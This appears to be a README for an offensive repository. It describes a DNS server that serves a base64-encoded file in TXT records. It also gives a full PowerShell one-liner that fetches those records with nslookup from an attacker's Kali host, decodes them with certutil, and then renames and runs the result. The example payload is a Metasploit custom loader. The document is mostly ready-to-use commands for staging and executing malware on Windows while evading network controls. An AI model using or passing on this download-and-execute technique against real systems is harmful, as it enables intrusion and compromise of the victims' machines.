# Windows_File_Transfers
Repository for ways to transfer files to Windows using built in binaries

Techniques
dns_server.py
-DNS Server that base64 encodes a file and then server that file in TXT records that are availble through DNS

Usage 
./dns_server.py (FILE_TO_Serve)

-Will output command to use powershell with nslookup to transfer file, then use certutil to decode.

-file that is created on windows system is named "newFile"

-run mv newFile to newFile.exe and run

Example Usage:
KALI 

./dns_server.py /root/Downloads/Metasploit_Custom_loader/loader_64.exe

Old ZoneFile exists, removing

Powershell File Transfer, enter text below in powershell window, change CHANGEME_IP_KALI to IP address of Kali system
 
del File.txt; del newFile; $c = ""; $i = 1; while ($i -le 303){$a = nslookup -q=txt "$i.texting.com" CHANGEME_IP_KALI | Select-String -Pattern '"' | Out-String ; $b = $a.trim(); $c += $b.Replace("`"",""); $i += 1}; $c.Replace("`n","") | Out-File -Append File.txt; certutil.exe -decode .\File.txt newFile

(SNIPPED)

WINDOWS:

-Paste text from script in powershell window, changing IP:

del File.txt; del newFile; $c = ""; $i = 1; while ($i -le 303){$a = nslookup -q=txt "$i.texting.com" 172.16.6.130 | Select-String -Pattern '"' | Out-String ; $b = $a.trim(); $c += $b.Replace("`"",""); $i += 1}; $c.Replace("`n","") | Out-File -Append File.txt; certutil.exe -decode .\File.txt newFile

-Rename file

mv newFile newFile.exe

-Run File

.\newFile.exe
